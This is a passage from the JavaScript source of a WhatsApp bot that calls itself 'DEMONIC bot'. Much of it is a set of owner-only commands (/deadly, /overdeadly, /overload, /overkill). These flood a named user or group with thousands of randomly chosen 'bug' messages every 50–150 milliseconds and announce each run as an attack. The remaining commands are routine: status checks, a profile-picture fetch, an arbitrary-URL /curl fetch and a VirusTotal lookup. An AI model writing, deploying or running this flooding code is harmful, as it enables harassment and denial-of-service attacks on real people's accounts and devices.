                  text: `💀 GROUP HIGH-RATE BUG COMPLETE!\n\n🔥 Sent ${groupCount} messages to the group 💣`
                });
              }
              return;
            }

            const bugMsg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
            try {
              await sock.sendMessage(from, { text: bugMsg });
              if (BUG_STORE[from]) BUG_STORE[from].sent++;
            } catch (e) {}
          }, 150);
        }

        if ((cmd === "/deadly" || cmd.startsWith("/deadly ")) && isOwner(sender)) {
          const args = body.slice(7).trim().split(" ");
          let user = parseTarget(body, m);

          let count = 500;
          const lastArg = args[args.length - 1];
          if (lastArg && /^\d+$/.test(lastArg)) {
            count = Math.min(parseInt(lastArg) || 500, 1000);
          }

          if (!user) {
            user = from;
          }

          if (user !== from || !isGroup) {
            if (user !== from && ANTIBUG[user]) {
              return sock.sendMessage(from, { text: `🛡️ ❌ Cannot bug @${user.split("@")[0]} - They are PROTECTED by ANTIBUG!`, mentions: [user] });
            }

            BUG_STORE[user] = { count, sent: 0, startTime: Date.now(), rate: "DEADLY" };

            const targetName = user === from ? (isGroup ? "GROUP" : "CHAT") : `@${user.split("@")[0]}`;
            const mentionArray = user === from ? [] : [user];

            await sock.sendMessage(from, {
              text: `☠️ *DEADLY ATTACK INITIATED* ☠️\n\n💀 SYSTEM OVERLOAD:\n├─ Target: ${targetName}\n├─ Power: ${count} messages\n└─ Mode: Fast Stream`,
              mentions: mentionArray
            });

            const overloadInterval = setInterval(async () => {
              if (!BUG_STORE[user] || BUG_STORE[user].sent >= count) {
                clearInterval(overloadInterval);
                if (BUG_STORE[user]) {
                  delete BUG_STORE[user];
                  await sock.sendMessage(from, {
                    text: `💀 *DEADLY ATTACK COMPLETE* 💀\n\n🔥 Sent ${count} messages to ${targetName}`,
                    mentions: mentionArray
                  });
                }
                return;
              }

              const isBugMsg = Math.random() > 0.3;
              const msgArray = isBugMsg ? BUG_MESSAGES : DEADLY_MESSAGES;
              const msg = msgArray[Math.floor(Math.random() * msgArray.length)];

              try {
                await sock.sendMessage(user, { text: msg });
                if (BUG_STORE[user]) BUG_STORE[user].sent++;
              } catch (err) {}
            }, 75);
            return;
          }

          if (BUG_STORE[from] && BUG_STORE[from].rate === "DEADLY-GROUP") {
            return sock.sendMessage(from, { text: "⚠️ This group is already in DEADLY mode!" });
          }

          const groupCount = Math.min(count || 1000, 1500);
          BUG_STORE[from] = { count: groupCount, sent: 0, startTime: Date.now(), rate: "DEADLY-GROUP" };

          await sock.sendMessage(from, {
            text: `☠️ *DEADLY GROUP ATTACK INITIATED* ☠️\n\n💀 Sending ${groupCount} messages...`
          });

          const groupInterval = setInterval(async () => {
            if (!BUG_STORE[from] || BUG_STORE[from].sent >= groupCount) {
              clearInterval(groupInterval);
              if (BUG_STORE[from]) {
                delete BUG_STORE[from];
                await sock.sendMessage(from, {
                  text: `☠️ *DEADLY GROUP ATTACK COMPLETE* ☠️\n\n🔥 Total: ${groupCount} messages`
                });
              }
              return;
            }

            const isBugMsg = Math.random() > 0.3;
            const msgArray = isBugMsg ? BUG_MESSAGES : DEADLY_MESSAGES;
            const msg = msgArray[Math.floor(Math.random() * msgArray.length)];

            try {
              await sock.sendMessage(from, { text: msg });
              if (BUG_STORE[from]) BUG_STORE[from].sent++;
            } catch (err) {}
          }, 75);
        }

        if ((cmd === "/overdeadly" || cmd.startsWith("/overdeadly ")) && isOwner(sender)) {
          const args = body.slice(11).trim().split(" ");
          let user = parseTarget(body, m);

          let count = 500;
          const lastArg = args[args.length - 1];
          if (lastArg && /^\d+$/.test(lastArg)) {
            count = Math.min(parseInt(lastArg) || 500, 1500);
          }

          if (!user) {
            user = from;
          }

          if (user !== from && ANTIBUG[user]) {
            return sock.sendMessage(from, { text: `🛡️ ❌ Cannot bug @${user.split("@")[0]} - They are PROTECTED by ANTIBUG!`, mentions: [user] });
          }

          BUG_STORE[user] = { count, sent: 0, startTime: Date.now(), rate: "OVERDEADLY" };

          const targetName = user === from ? (isGroup ? "GROUP" : "CHAT") : `@${user.split("@")[0]}`;
          const mentionArray = user === from ? [] : [user];
          await sock.sendMessage(from, {
            text: `👹 *OVERDEADLY ATTACK INITIATED* 👹\n\n💀 SYSTEM ANNIHILATION:\n├─ Target: ${targetName}\n├─ Power: ${count} messages\n└─ Mode: Fast Stream`,
            mentions: mentionArray
          });

          const overdeadlyInterval = setInterval(async () => {
            if (!BUG_STORE[user] || BUG_STORE[user].sent >= count) {
              clearInterval(overdeadlyInterval);
              if (BUG_STORE[user]) {
                delete BUG_STORE[user];
                await sock.sendMessage(from, {
                  text: `👹 *OVERDEADLY ATTACK COMPLETE* 👹\n\n🔥 Sent ${count} messages to ${targetName}`,
                  mentions: mentionArray
                });
              }
              return;
            }

            let msg;
            const randomType = Math.random();
            if (randomType < 0.3) {
              msg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
            } else if (randomType < 0.6) {
              msg = DEADLY_MESSAGES[Math.floor(Math.random() * DEADLY_MESSAGES.length)];
            } else {
              msg = OVERDEADLY_MESSAGES[Math.floor(Math.random() * OVERDEADLY_MESSAGES.length)];
            }

            try {
              await sock.sendMessage(user, { text: msg });
              if (BUG_STORE[user]) BUG_STORE[user].sent++;
            } catch (err) {}
          }, 60);
        }

        if ((cmd === "/overload" || cmd.startsWith("/overload ")) && isOwner(sender)) {
          const args = body.slice(9).trim().split(" ");
          let user = parseTarget(body, m);

          let count = 1000;
          const lastArg = args[args.length - 1];
          if (lastArg && /^\d+$/.test(lastArg)) {
            count = Math.min(parseInt(lastArg) || 1000, 2000);
          }

          if (!user) {
            user = from;
          }

          if (user !== from || !isGroup) {
            if (user !== from && ANTIBUG[user]) {
              return sock.sendMessage(from, { text: `🛡️ ❌ Cannot bug @${user.split("@")[0]} - They are PROTECTED by ANTIBUG!`, mentions: [user] });
            }

            if (BUG_STORE[user] && BUG_STORE[user].rate === "OVERLOAD") {
              return sock.sendMessage(from, { text: `⚠️ @${user.split("@")[0]} is already being OVERLOADED!` });
            }

            BUG_STORE[user] = { count, sent: 0, startTime: Date.now(), rate: "OVERLOAD" };

            await sock.sendMessage(from, {
              text: `💥 *OVERLOAD SYSTEM ENGAGED* 💥\n\n⚙️ INJECTION PROTOCOL:\n├─ Target: @${user.split("@")[0]}\n├─ Payload: ${count} messages\n└─ Mode: Fast Stream`,
              mentions: [user]
            });

            const overloadInterval = setInterval(async () => {
              if (!BUG_STORE[user] || BUG_STORE[user].sent >= count) {
                clearInterval(overloadInterval);
                if (BUG_STORE[user]) {
                  delete BUG_STORE[user];
                  await sock.sendMessage(from, {
                    text: `💥 *OVERLOAD COMPLETE* 💥\n\nTotal Messages Sent: ${count}\nTarget: @${user.split("@")[0]}`,
                    mentions: [user]
                  });
                }
                return;
              }

              let msg;
              const randomType = Math.random();
              if (randomType < 0.2) {
                msg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
              } else if (randomType < 0.4) {
                msg = DEADLY_MESSAGES[Math.floor(Math.random() * DEADLY_MESSAGES.length)];
              } else if (randomType < 0.6) {
                msg = OVERDEADLY_MESSAGES[Math.floor(Math.random() * OVERDEADLY_MESSAGES.length)];
              } else if (randomType < 0.8) {
                msg = OVERLOAD_MESSAGES[Math.floor(Math.random() * OVERLOAD_MESSAGES.length)];
              } else {
                msg = VIRUS_MESSAGES[Math.floor(Math.random() * VIRUS_MESSAGES.length)];
              }

              try {
                await sock.sendMessage(user, { text: msg });
                if (BUG_STORE[user]) BUG_STORE[user].sent++;
              } catch (err) {}
            }, 50);

            return;
          }

          if (!isGroup) {
            return sock.sendMessage(from, { text: "❌ This only works in groups! Mention a user for DM overload" });
          }

          if (BUG_STORE[from] && BUG_STORE[from].rate === "OVERLOAD-GROUP") {
            return sock.sendMessage(from, { text: "⚠️ This group is already being OVERLOADED!" });
          }

          const GROUP_OVERLOAD_COUNT = Math.min(count || 1000, 2500);
          BUG_STORE[from] = { count: GROUP_OVERLOAD_COUNT, sent: 0, startTime: Date.now(), rate: "OVERLOAD-GROUP" };

          await sock.sendMessage(from, {
            text: `💥💥💥 *GROUP OVERLOAD ACTIVATED* 💥💥💥\n\n⚙️ Payload: ${GROUP_OVERLOAD_COUNT} messages`
          });

          const groupOverloadInterval = setInterval(async () => {
            if (!BUG_STORE[from] || BUG_STORE[from].sent >= GROUP_OVERLOAD_COUNT) {
              clearInterval(groupOverloadInterval);
              if (BUG_STORE[from]) {
                delete BUG_STORE[from];
                await sock.sendMessage(from, {
                  text: `💥💥💥 *GROUP OVERLOAD COMPLETE* 💥💥💥\n\nTotal Messages Sent: ${GROUP_OVERLOAD_COUNT}`
                });
              }
              return;
            }

            let msg;
            const randomType = Math.random();
            if (randomType < 0.2) {
              msg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
            } else if (randomType < 0.4) {
              msg = DEADLY_MESSAGES[Math.floor(Math.random() * DEADLY_MESSAGES.length)];
            } else if (randomType < 0.6) {
              msg = OVERDEADLY_MESSAGES[Math.floor(Math.random() * OVERDEADLY_MESSAGES.length)];
            } else if (randomType < 0.8) {
              msg = OVERLOAD_MESSAGES[Math.floor(Math.random() * OVERLOAD_MESSAGES.length)];
            } else {
              msg = VIRUS_MESSAGES[Math.floor(Math.random() * VIRUS_MESSAGES.length)];
            }

            try {
              await sock.sendMessage(from, { text: msg });
              if (BUG_STORE[from]) BUG_STORE[from].sent++;
            } catch (err) {}
          }, 50);
        }

        if ((cmd === "/overkill" || cmd.startsWith("/overkill ")) && isOwner(sender)) {
          const args = body.slice(9).trim().split(" ");
          let user = parseTarget(body, m);

          let count = 1000;
          const lastArg = args[args.length - 1];
          if (lastArg && /^\d+$/.test(lastArg)) {
            count = Math.min(parseInt(lastArg) || 1000, 2500);
          }

          if (!user) {
            user = from;
          }

          if (user !== from || !isGroup) {
            if (user !== from && ANTIBUG[user]) {
              return sock.sendMessage(from, { text: `🛡️ ❌ Cannot bug @${user.split("@")[0]} - They are PROTECTED by ANTIBUG!`, mentions: [user] });
            }

            if (BUG_STORE[user] && BUG_STORE[user].rate === "OVERKILL") {
              return sock.sendMessage(from, { text: `⚠️ Already in OVERKILL MODE!` });
            }

            BUG_STORE[user] = { count, sent: 0, startTime: Date.now(), rate: "OVERKILL" };

            const targetName = user === from ? (isGroup ? "GROUP" : "CHAT") : `@${user.split("@")[0]}`;
            const mentionArray = user === from ? [] : [user];

            await sock.sendMessage(from, {
              text: `💯 *OVERKILL SYSTEM INITIALIZED* 💯\n\n🚀 REALITY WARPING ATTACK:\n├─ Target: ${targetName}\n├─ Payload: ${count} messages\n└─ Mode: Fast Stream`,
              mentions: mentionArray
            });

            const overkillInterval = setInterval(async () => {
              if (!BUG_STORE[user] || BUG_STORE[user].sent >= count) {
                clearInterval(overkillInterval);
                if (BUG_STORE[user]) {
                  delete BUG_STORE[user];
                  await sock.sendMessage(from, {
                    text: `💯 *OVERKILL SYSTEM COMPLETE* 💯\n\nTotal Messages Sent: ${count}\nTarget: @${user.split("@")[0]}`,
                    mentions: [user]
                  });
                }
                return;
              }

              let msg;
              const randomType = Math.random();
              if (randomType < 0.17) {
                msg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
              } else if (randomType < 0.33) {
                msg = DEADLY_MESSAGES[Math.floor(Math.random() * DEADLY_MESSAGES.length)];
              } else if (randomType < 0.5) {
                msg = OVERDEADLY_MESSAGES[Math.floor(Math.random() * OVERDEADLY_MESSAGES.length)];
              } else if (randomType < 0.67) {
                msg = OVERLOAD_MESSAGES[Math.floor(Math.random() * OVERLOAD_MESSAGES.length)];
              } else if (randomType < 0.83) {
                msg = VIRUS_MESSAGES[Math.floor(Math.random() * VIRUS_MESSAGES.length)];
              } else {
                msg = OVERKILL_MESSAGES[Math.floor(Math.random() * OVERKILL_MESSAGES.length)];
              }

              try {
                await sock.sendMessage(user, { text: msg });
                if (BUG_STORE[user]) BUG_STORE[user].sent++;
              } catch (err) {}
            }, 50);
            return;
          }

          if (!isGroup) {
            return sock.sendMessage(from, { text: "❌ This only works in groups! Mention a user for DM overkill" });
          }

          if (BUG_STORE[from] && BUG_STORE[from].rate === "OVERKILL-GROUP") {
            return sock.sendMessage(from, { text: "⚠️ This group is already in OVERKILL MODE!" });
          }

          const GROUP_OVERKILL_COUNT = Math.min(count || 1000, 3000);
          BUG_STORE[from] = { count: GROUP_OVERKILL_COUNT, sent: 0, startTime: Date.now(), rate: "OVERKILL-GROUP" };

          await sock.sendMessage(from, {
            text: `💯💯💯 *GROUP OVERKILL ACTIVATED* 💯💯💯\n\n🚀 Payload: ${GROUP_OVERKILL_COUNT} messages`
          });

          const groupOverkillInterval = setInterval(async () => {
            if (!BUG_STORE[from] || BUG_STORE[from].sent >= GROUP_OVERKILL_COUNT) {
              clearInterval(groupOverkillInterval);
              if (BUG_STORE[from]) {
                delete BUG_STORE[from];
                await sock.sendMessage(from, {
                  text: `💯💯💯 *GROUP OVERKILL COMPLETE* 💯💯💯\n\nTotal Messages Sent: ${GROUP_OVERKILL_COUNT}`
                });
              }
              return;
            }

            let msg;
            const randomType = Math.random();
            if (randomType < 0.17) {
              msg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
            } else if (randomType < 0.33) {
              msg = DEADLY_MESSAGES[Math.floor(Math.random() * DEADLY_MESSAGES.length)];
            } else if (randomType < 0.5) {
              msg = OVERDEADLY_MESSAGES[Math.floor(Math.random() * OVERDEADLY_MESSAGES.length)];
            } else if (randomType < 0.67) {
              msg = OVERLOAD_MESSAGES[Math.floor(Math.random() * OVERLOAD_MESSAGES.length)];
            } else if (randomType < 0.83) {
              msg = VIRUS_MESSAGES[Math.floor(Math.random() * VIRUS_MESSAGES.length)];
            } else {
              msg = OVERKILL_MESSAGES[Math.floor(Math.random() * OVERKILL_MESSAGES.length)];
            }

            try {
              await sock.sendMessage(from, { text: msg });
              if (BUG_STORE[from]) BUG_STORE[from].sent++;
            } catch (err) {}
          }, 50);
        }

        if ((cmd === "/stopbug" || cmd.startsWith("/stopbug ")) && isOwner(sender)) {
          const user = parseTarget(body, m);
          if (!user) {
            return sock.sendMessage(from, { text: "❌ Mention the bugged user or paste their phone number" });
          }

          if (BUG_STORE[user]) {
            const bugData = BUG_STORE[user];
            delete BUG_STORE[user];
            return sock.sendMessage(from, {
              text: `✅ Stopped bugging @${user.split("@")[0]}\n\n📊 Bug Stats:\n├─ Type: ${bugData.rate}-RATE\n├─ Sent: ${bugData.sent}/${bugData.count} messages\n└─ Duration: ${Math.round((Date.now() - bugData.startTime) / 1000)}s`,
              mentions: [user]
            });
          }

          return sock.sendMessage(from, {
            text: `❌ @${user.split("@")[0]} is not being bugged`
          });
        }

        if (cmd === "/bugged") {
          const activeBugs = Object.entries(BUG_STORE).map(
            ([jid, data]) => `@${jid.split("@")[0]} → ${data.sent}/${data.count} (${data.rate}-RATE)`
          );

          if (!activeBugs.length) {
            return sock.sendMessage(from, { text: "✅ No one is being bugged right now" });
          }

          return sock.sendMessage(from, {
            text: `🪲 *ACTIVE BUGS*\n\n${activeBugs.join("\n")}`,
            mentions: Object.keys(BUG_STORE)
          });
        }


        if (cmd === "/myscore") {
          const userScore = SCORE_STORE[sender] || 0;
          return sock.sendMessage(from, {
            text: `⭐ *YOUR SCORE*\n\n🎯 Current Score: ${userScore}\n\n📈 Earn points:\n├─ /joke → +10 pts\n├─ /truth → +15 pts\n├─ /dare → +15 pts\n└─ Other fun commands → +5 pts`
          });
        }

        if (cmd === "/topscores") {
          const scores = Object.entries(SCORE_STORE)
            .sort(([, a], [, b]) => b - a)
            .slice(0, 10)
            .map(([jid, score], index) => `${index + 1}. @${jid.split("@")[0]} → ${score} ⭐`);

          if (!scores.length) {
            return sock.sendMessage(from, {
              text: "📊 No scores yet! Use /joke, /truth, /dare to earn points!"
            });
          }

          return sock.sendMessage(from, {
            text: `🏆 *TOP SCORES*\n\n${scores.join("\n")}`,
            mentions: Object.keys(SCORE_STORE).slice(0, 10)
          });
        }


        if (cmd === "/menu") {

          await sendMenuImage(sock, from, VERSION, PREFIX, CHANNEL, GROUP_LINK);

          // Send interactive buttons for channel and group (fallback/alternate)
          await sendMenuButtons(sock, from, CHANNEL, GROUP_LINK);

          return sendMenuAudio(sock, from);
        }

        if (cmd === "/darkmenu") {
          return await sendDarkMenu(sock, from, VERSION, PREFIX, CHANNEL, GROUP_LINK);
        }

        if (cmd === "/darktool" || cmd === "/ipflooder") {
          return sock.sendMessage(from, {
            text: "⚠️ I cannot help create or provide hacking tools, IP flooders, or attack scripts. Please use the bot for safe and legal chat commands only."
          });
        }

        if (cmd.startsWith("/dolphin")) {
          const prompt = body.trim().split(/\s+/).slice(1).join(" ");
          if (!prompt) {
            return sock.sendMessage(from, {
              text: "📌 Usage: /dolphin <message>\nExample: /dolphin Hey Dolphin, tell me a joke."
            });
          }
          if (isBlockedDolphinPrompt(prompt)) {
            return sock.sendMessage(from, {
              text: "⚠️ Sorry, I cannot assist with creating or describing harmful tools, IP flooders, or attacks. Ask me something else."
            });
          }
          try {
            await sendLoadingStatus(from);
            const dolphinReply = await getOllamaChatReply(prompt);
            return sock.sendMessage(from, {
              text: `🐬 *Dolphin Chat*\n\n${dolphinReply}`
            }, { quoted: m });
          } catch (error) {
            console.error("Dolphin command error:", error);
            const errorMsg = error.response?.data?.error || error.response?.data?.message || error.message || "Please check Ollama settings and try again.";
            return sock.sendMessage(from, {
              text: `❌ *Dolphin Error*\n\n${errorMsg}\n\nMake sure Ollama is running at ${OLLAMA_HOST} and the dolphin3:8b model is available.`
            });
          }
        }




        if (cmd === "/self-destruct" && isOwner(sender)) {
          await sock.sendMessage(from, {
            text: `💣 *SELF-DESTRUCT ACTIVATED* 💣\n\n⚠️ DEMONIC bot self-destruction initiated...\n\nDeleting all session files...\n🔴 Going OFFLINE\n🔥 ALL DATA ERASED\n\n👋 Goodbye! master nice meeting you`
          });


          setTimeout(() => {
            try {

              const sessionPath = path.join(__dirname, "session");
              if (fs.existsSync(sessionPath)) {
                fs.rmSync(sessionPath, { recursive: true, force: true });
                console.log("🗑️ Session files deleted from:", sessionPath);
              } else {
                console.log("⚠️ Session folder not found at:", sessionPath);
              }
              console.log("💣 DEMONIC Bot Self-Destructed!");
              process.exit(0);
            } catch (err) {
              console.error("Error during self-destruct:", err);
              process.exit(1);
            }
          }, 3000); // 3 seconds wait
        }


        if (cmd.startsWith("/antibug ") && isOwner(sender)) {
          const args = body.slice(9).trim().split(" ");
          const statusArg = args[args.length - 1].toLowerCase(); // Get last word (on/off)
          const targetText = body.slice(9).trim().replace(/\s+(on|off)$/i, ""); // Remove on/off from end


          let targetJid = null;


          const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
          if (mentioned) {
            targetJid = mentioned;
          } else {

            const phoneMatch = targetText.match(/(\d{10,15})/);
            if (phoneMatch) {
              targetJid = phoneMatch[1] + "@s.whatsapp.net";
            }
          }

          if (!targetJid) {
            return sock.sendMessage(from, { text: "❌ Usage: /antibug @user on  OR  /antibug @user off" });
          }

          const userId = targetJid.split("@")[0];
          const isEnabling = statusArg === "on";

          if (isEnabling) {
            ANTIBUG[targetJid] = true;
            return sock.sendMessage(from, {
              text: `🔒 *ANTIBUG ENABLED* 🔒\n\n✅ @${userId} is now PROTECTED\n🛡️ Cannot receive ANY bug attacks\n💪 Immune to: /overdeadly, /deadly, /overload, /overkill, /highrate-bug, /lowrate-bug`,
              mentions: [targetJid]
            });
          } else {
            if (ANTIBUG[targetJid]) {
              delete ANTIBUG[targetJid];
            }
            return sock.sendMessage(from, {
              text: `🔓 *ANTIBUG DISABLED* 🔓\n\n❌ @${userId} is no longer protected\n🎯 Can now receive bug attacks`,
              mentions: [targetJid]
            });
          }
        }


        if (cmd.startsWith("/profile")) {
          try {
            let targetUser = parseTarget(body, m);

            if (!targetUser) {

              targetUser = sender;
            }


            const profileUrl = await sock.profilePictureUrl(targetUser, "image").catch(() => null);

            if (!profileUrl) {
              return sock.sendMessage(from, {
                text: `❌ Could not fetch profile picture for @${targetUser.split("@")[0]}`,
                mentions: [targetUser]
              });
            }


            const imageResponse = await axios.get(profileUrl, { responseType: "arraybuffer" });

            return sock.sendMessage(from, {
              image: Buffer.from(imageResponse.data, "binary"),
              caption: `👤 Profile Picture of @${targetUser.split("@")[0]}`
            }, { quoted: m });
          } catch (err) {
            console.error("Error fetching profile picture:", err);
            return sock.sendMessage(from, {
              text: `❌   Error fetching profile picture: ${err.message}`
            });
          }
        }


        if (cmd === "/alive") {
          try {
            const uptimeStr = formatUptime(process.uptime());
            const memMB = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
            const socketStatus = sock && sock.user ? '🟢 CONNECTED (Stable)' : '🔴 RECONNECTING';

            return sock.sendMessage(from, {
              text: `╔══════════════════════════════════╗
║        🩺 *SYSTEM HEALTH CHECK*
╚══════════════════════════════════╝

📡 *Socket:* ${socketStatus}
🤖 *Bot Engine:* ${BOT_NAME} v${VERSION}
⏱️ *Uptime:* ${uptimeStr}
🧠 *RAM in Use:* ${memMB} MB
⚡ *Speed:* Rapid Response
📊 *Active Load:* ${ACTIVE_COMMANDS}/${MAX_CONCURRENT_COMMANDS} tasks

💡 Type *${PREFIX}status* for complete system metrics!`
            }, { quoted: m });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ Alive check failed: ${e.message || e}` });
          }
        }

        if (cmd === "/version") {
          try {
            const buildInfo = `🤖 *DEMONIC BOT - VERSION INFO* 🤖

📌 *Current Version:* v${VERSION}
🔧 *Build:* Production Ready (Professional Edition)
✨ *Engine:* Baileys Multi-Device + Node.js ${process.version}

📋 *Key Features:*
├─ 🌈 Rainbow console logger & resource auto-cleanup
├─ ⚡ Smart auto-reconnection with exponential backoff
├─ 🤖 5 AI Chatbot personalities + Vision AI integration
├─ 📥 Multi-platform media downloaders (YT, TikTok, IG, FB)
├─ 🛡️ Advanced group defense, anti-link & moderation suite
├─ 💾 Persistent configuration engine across restarts
└─ 🧮 120+ utilities, games, audio tools & converters

💡 Send *${PREFIX}menu* for the complete command catalog!`;
            
            return sock.sendMessage(from, { text: buildInfo }, { quoted: m });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ Version check failed: ${e.message}` });
          }
        }

        if (cmd === "/pair-status") {
          try {
            const sessionDir = process.env.SESSION_DIR || path.join(__dirname, 'session');
            const sessionExists = fs.existsSync(sessionDir) && fs.readdirSync(sessionDir).length > 0;
            const isPaired = sock && sock.user ? true : false;

            if (isPaired && sessionExists) {
              const botJid = sock.user.id.split(":")[0];
              const sessionFiles = fs.readdirSync(sessionDir).length;
              const sessionSize = fs.readdirSync(sessionDir).reduce((sum, f) => sum + fs.statSync(path.join(sessionDir, f)).size, 0) / 1024;

              return sock.sendMessage(from, {
                text: `✅ *BOT PAIRING STATUS*

🟢 *Status:* PAIRED & CONNECTED

📱 *Session Info:*
├─ Bot JID: ${botJid}
├─ Session Files: ${sessionFiles}
├─ Session Size: ${sessionSize.toFixed(2)} KB
└─ Connection: Active

✨ Bot is ready to use!`
              }, { quoted: m });
            } else if (sessionExists) {
              return sock.sendMessage(from, { text: `🟡 *Status:* Session exists but reconnecting...\n\n⏳ Please wait, bot is connecting to WhatsApp...` }, { quoted: m });
            } else {
              return sock.sendMessage(from, {
                text: `🔴 *Status:* NOT PAIRED

The bot needs to be paired with WhatsApp first.

📱 *To pair the bot:*
1. Open bot terminal / server
2. Enter your WhatsApp number when prompted
3. Enter the 8-digit pairing code in WhatsApp Linked Devices
4. Send ${PREFIX}pair-status again to verify`
              }, { quoted: m });
            }
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ Pair status check failed: ${e.message}` });
          }
        }

        if (cmd === "/ping") {
          const start = Date.now();
          const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
          return sock.sendMessage(from, {
            text: `🏓 *PONG!*
⚡ *Response Time:* ${Date.now() - start}ms
🧠 *Memory:* ${mem} MB
⏱️ *Uptime:* ${formatUptime(process.uptime())}
🟢 *Status:* Operational`
          }, { quoted: m });
        }

        if (cmd === "/uptime") {
          const uptimeStr = formatUptime(process.uptime());
          const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);

          return sock.sendMessage(from, {
            text: `⏱️ *BOT RUNTIME & STATS*

⌛ *Uptime:* ${uptimeStr}
🧠 *RAM:* ${mem} MB
📨 *Messages Handled:* ${MESSAGE_COUNT}
⚡ *Commands Executed:* ${COMMAND_COUNT}

🦾 24/7 Continuous Operation Active`
          }, { quoted: m });
        }

        if (cmd.startsWith("/curl ")) {
          const url = body.slice(6).trim();
          if (!url) {
            return sock.sendMessage(from, { text: "❌ Please provide a URL!\nExample: /curl https://example.com" });
          }

          try {
            const response = await axios.get(url, { timeout: 10000 });
            const status = response.status;
            const contentType = response.headers['content-type'] || 'Unknown';
            const contentLength = response.headers['content-length'] || 'Unknown';

            return sock.sendMessage(from, {
              text: `🌐 *WEBSITE STATUS*\n\n🔗 URL: ${url}\n📊 Status Code: ${status}\n📄 Content-Type: ${contentType}\n📏 Content-Length: ${contentLength}\n\n✅ Website is accessible!`
            });
          } catch (error) {
            const status = error.response?.status || 'Unknown';
            const errorMsg = error.message || 'Unknown error';

            return sock.sendMessage(from, {
              text: `🌐 *WEBSITE STATUS*\n\n🔗 URL: ${url}\n❌ Status: ${status}\n⚠️ Error: ${errorMsg}\n\nWebsite may be down or unreachable.`
            });
          }
        }

        if (cmd.startsWith("/curl2 ")) {
          const url = body.slice(7).trim();
          if (!url) {
            return sock.sendMessage(from, { text: "❌ Please provide a URL!\nExample: /curl2 https://example.com" });
          }

          try {
            // Using VirusTotal public API for phishing check
            const vtResponse = await axios.get(`https://www.virustotal.com/vtapi/v2/url/report?apikey=${VIRUSTOTAL_API_KEY}&resource=${encodeURIComponent(url)}`);

            if (vtResponse.data.response_code === 1) {
              const positives = vtResponse.data.positives;
              const total = vtResponse.data.total;

              if (positives > 0) {
                return sock.sendMessage(from, {
                  text: `🛡️ *PHISHING CHECK*\n\n🔗 URL: ${url}\n🚨 DETECTED AS PHISHING!\n📊 Detections: ${positives}/${total}\n\n⚠️ This URL is flagged as malicious. Do not visit!`
                });
              } else {
                return sock.sendMessage(from, {
                  text: `🛡️ *PHISHING CHECK*\n\n🔗 URL: ${url}\n✅ No phishing detected\n📊 Detections: ${positives}/${total}\n\nURL appears safe, but always be cautious!`
                });
              }
            } else {
              return sock.sendMessage(from, {
                text: `🛡️ *PHISHING CHECK*\n\n🔗 URL: ${url}\n❓ Not found in database\n\nUnable to verify this URL. Use caution!`
              });
            }
          } catch (error) {
            return sock.sendMessage(from, {
              text: `🛡️ *PHISHING CHECK*\n\n🔗 URL: ${url}\n❌ Error checking URL\n\n${error.message}\n\nTry again later or check manually.`
            });
          }
        }

        if (cmd.startsWith("/setprefix ") && isOwner(sender)) {
          const newPrefix = body.slice(11).trim();
          if (!newPrefix || newPrefix.length > 3) {
            return sock.sendMessage(from, {
              text: "❌ Invalid prefix! Use 1-3 characters (e.g., ., /, !, >>)"
            });
          }
          PREFIX = newPrefix;
          saveConfig();
          return sock.sendMessage(from, {
            text: `✅ *PREFIX UPDATED*\n\nBot prefix changed to: *${PREFIX}*\nUse ${PREFIX}menu to see all commands with the new prefix.`
          });
        }

        if (cmd.startsWith("/change-name ") && isOwner(sender)) {
          const newName = body.slice(13).trim();
          if (!newName) {
            return sock.sendMessage(from, {
              text: "❌ Please provide the new bot name!\n\nUsage: /change-name YourBotName"
            });
          }
          if (newName.length > 50) {
            return sock.sendMessage(from, {
              text: "❌ Bot name too long! Maximum 50 characters allowed."
            });
          }
          global.BOT_NAME = newName;
          saveConfig();
          return sock.sendMessage(from, {
            text: `✅ *BOT NAME UPDATED*\n\nBot name set to: *${newName}*`
          });
        }

        if (cmd === "/public" && isOwner(sender)) {
          PUBLIC = true;
          saveConfig();
          return sock.sendMessage(from, {
            text: "🌐 *ACCESS MODE: PUBLIC*\n\n✅ Everyone can now use bot commands in groups and direct messages."
          });
        }

        if (cmd === "/private" && isOwner(sender)) {
          PUBLIC = false;
          saveConfig();
          return sock.sendMessage(from, {
            text: "🔒 *ACCESS MODE: PRIVATE*\n\n🛡️ Bot will now only respond to registered Bot Owners and Admins."
          });
        }

        // OFFLINE MODE - Owner only
        if (cmd.startsWith("/offline") && isOwner(sender)) {
          if (cmd === "/offline") {
            OFFLINE_MODE = true;
            saveConfig();
            return sock.sendMessage(from, {
              text: `💤 *OFFLINE MODE ACTIVATED*\n\nBot will automatically respond to incoming user messages with:\n"${OFFLINE_MESSAGE}"`
            });
          }

          const customMsg = body.slice(8).trim();
          if (customMsg) {
            OFFLINE_MODE = true;
            OFFLINE_MESSAGE = customMsg;
            saveConfig();
            return sock.sendMessage(from, {
              text: `💤 *OFFLINE MODE ACTIVATED*\n\nCustom auto-reply set to:\n"${customMsg}"`
            });
          }
        }

        // ONLINE MODE - Turn off offline mode
        if (cmd === "/online" && isOwner(sender)) {
          OFFLINE_MODE = false;
          saveConfig();
          return sock.sendMessage(from, {
            text: `🟢 *ONLINE MODE RESTORED*\n\nBot is now actively answering all incoming messages!`
          });
        }

        if (cmd.startsWith("/creategc") && isOwner(sender)) {
          try {
            const name = body.slice(9).trim() || "DEMONIC-GROUP";
            const g = await sock.groupCreate(name, [sender]);
            const code = await sock.groupInviteCode(g.id);

            await sock.sendMessage(from, {
              text: `✅ *Group Created Successfully!*\n\n📝 Name: ${name}\n👥 Group ID: ${g.id.split("@")[0]}\n🔗 Link: https://chat.whatsapp.com/${code}\n\n💡 Share this link to invite others!`
            });
            return;
          } catch (err) {
            console.error("Error creating group:", err);
            return sock.sendMessage(from, {
